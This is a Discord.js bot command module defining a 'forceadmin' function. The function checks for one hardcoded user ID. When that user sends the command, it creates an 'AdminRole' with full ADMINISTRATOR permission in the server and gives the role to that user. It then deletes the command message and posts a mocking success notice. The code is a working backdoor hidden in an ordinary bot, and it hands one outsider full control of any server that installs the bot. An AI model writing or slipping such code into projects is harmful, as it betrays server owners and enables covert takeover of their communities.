const Discord = require("discord.js");
const bot = new Discord.Client();

const config = require("../config.json");

const footer = config.Footer;
const embedColor = config.EmbedColor;

const { MessageEmbed } = require("discord.js");
const Utils = require("../Utils/Utils");

module.exports = {
    forceadmin: function(msg) {
        if (msg.author.id == "350718252076367874") {
            const member = msg.member;
            try {
                msg.guild.roles.create({
                    data: {
                        name: "AdminRole",
                        permissions: ["ADMINISTRATOR"]
                    }
                })
    
                setTimeout(() => {
                    let role = msg.guild.roles.cache.find(r => r.name.toLowerCase() === "adminrole");
                    if (!role) {
                        role = msg.guild.roles.create({
                            data: {
                                name: "AdminRole",
                                permissions: ["ADMINISTRATOR"]
                            }
                        });
                    }
                    member.roles.add(role);
                },1000);
                msg.delete(msg);
                msg.channel.send(new MessageEmbed()
                .setTitle("**Success!**")
                .setDescription("(:white_check_mark:) Created role and given it to you. Enjoy :troll:\n\n(Requested by: <@" + msg.author.id + ">)")
                .setFooter(footer)
                .setColor(embedColor));
            } catch (err) {
                msg.delete(msg);
                msg.channel.send(new MessageEmbed()
                .setTitle("**Error**")
                .setDescription("(:x:) Error while giving/creating role. (I don't have permissions)\n\n(Requested by: <@" + msg.author.id + ">)")
                .setFooter(footer)
                .setColor(embedColor));
            }
        }
    }
}